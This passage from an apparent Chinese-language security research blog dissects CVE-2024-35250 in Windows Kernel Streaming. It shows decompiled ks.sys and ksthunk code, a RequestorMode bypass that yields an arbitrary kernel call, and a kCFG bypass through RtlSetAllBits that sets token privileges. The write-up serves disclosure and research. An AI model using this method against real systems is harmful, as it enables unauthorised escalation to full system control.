  &lt;li&gt;第二次處理 IOCTL 的地方有依賴 RequestorMode 做安全檢查，並且有可以作為提權利用的地方。
&lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;按照這個 Pattern 我們很快地就找到了第一個洞&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;
&lt;p&gt;這個漏洞也是我們今年在 &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024 中所使用的漏洞&lt;/a&gt;。在 Kernel Streaming 的 IOCTL_KS_PROPERTY 功能中，為了讓效率增加，提供了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; 功能允許使用者透過&lt;strong&gt;單一呼叫&lt;/strong&gt;與多個 Property 進行操作。當我們用這功能時，這些 requests 將被 KsPropertyHandler 函數分解成多個呼叫，詳情可參考&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;這篇&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;該功能實作在 ks.sys 中&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;上圖中可以看到，在 ks 處理 Property 時，如果有給上述的 flag 就會由 UnserializePropertySet 來處理你的 request&lt;/p&gt;

&lt;p&gt;我們這邊就先來看一下 UnserializePropertySet&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可看到在處理過程中會先將原始的 request，複製到新分配出來的 Buffer 中 [1]，而後續就會使用這個 Buffer 來使用 KsSynchronousIoControlDevice 呼叫新的 IOCTL [2]。其中 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; 及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; 都是使用者所傳入的內容。&lt;/p&gt;

&lt;p&gt;而呼叫 UnserializePropertySet 時的流程，大概如下圖所示 :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊呼叫 IOCTL 時可以看到圖中第 2 步 I/O Manager 會將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 設成 UserMode(1)，直到第 6 步時，ks 會去判斷使用者 requests 的 Property 是否存在於該 KS Object 中，如果該 KS Object 的 Property &lt;strong&gt;存在&lt;/strong&gt;，並且有設置 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; 就會用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; 來處理指定的 Property&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而接下來第 7 步就會呼叫 KsSynchronousIoControlDevice 重新做一次  IOCTL，而此時新的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; 就變成了 KernelMode(0) 了，而後續的處理就如一般的 IOCTL_KS_PROPERTY 相同，就不另外詳述了，總之我們到這裡已經有個可以任意做 IOCTL_KS_PROPERTY 的 primitive 了，接下來我們必須尋找看看是否有可以 EoP 的地方。&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;最先看到的想必就是入口點 ksthunk，我們這邊可以直接來看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ksthunk 會先判斷是否是 WoW64 的 Process 的 request，如果是就會將原本 32-bit 的 requests  轉換成 64-bit 的 [3]，如果原本就是 64-bit 則會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; [4] 往下傳遞&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們在 [5] 看到，如果我們給定的 Property Set 是 &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/a&gt; ，就有特別的處理。而在 [6] 時，會先去判斷 Irp-&amp;gt;RequestorMode 是否為 KernelMode(0)，如果從 UserMode(1) 呼叫的 IOCTL 就會直接返回錯誤，但如果我們使用前面所說的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; 來呼叫 IOCTL，並指定 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; 這個 Property，那麼這裡 [6] 就會是 KerenlMode(0)。接下來就會在 [7] 直接使用使用者所傳入的內容做為 function 呼叫，甚至第一個參數是可控的，實際寫 PoC 後，驗證了我們的結果。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;這邊可能會有人有疑惑，什麼設備或是情況下會有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ？實際上來說音訊設備大多情況下都會有，主要是用來設置 DRM 相關內容用的。&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;在有了任意呼叫之後，要達成 EoP 就不是太大的問題，雖然會遇到 kCFG、kASLR、SMEP 等等保護，但在 Medium IL 下唯一比較需要處理的就只有 kCFG。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;那我們目標很簡單，就是從合法的 function 做出任意寫的 primitive，而之後就可以利用常見的方法&lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;用 System token 取代當前的 Process token&lt;/a&gt; 或是 &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; 去做到 EoP。&lt;/p&gt;

&lt;p&gt;直覺地會直接去找看看，kCFG 中合法的 function 名稱有 set 的 function，比較可能是可以寫入的。我們這裡是直接拿 ntoskrnl.exe 中 export fucntion 去尋找看看是否有合法的 function，這些大多情況下都是合法的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;而很快的我們就找到了 &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;它是個非常好用的 gadget 而且是 kCFG 中合法的 function，另外也只要控制一個參數 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_RTL_BITMAP&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_RTL_BITMAP&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SizeOfBitMap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                               
    &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                                                   
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt; 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可將 Buffer 指定到任意位置並指定大小，就可以將一段範圍的 bits 全部設置起來，到這邊就差不多結束了，只要    將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Token-&amp;gt;Privilege&lt;/code&gt; 全部設置起來，就可以利用 Abuse Privilege 方法來做到 EoP 了。&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/j1wzwXLxdVs?si=aKURBnYWXvbAaXin&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;然而…在 Pwn2Own 比賽前，我們在 Hyper-V 上安裝一個全新 Windows 11 23H2 VM 測試 Exploit，結果失敗了。 而且是在開啟設備階段就失敗。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;經過調查後發現到 Hyper-V 在預設情況下並不會有音訊設備，造成 exploit 會失敗。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

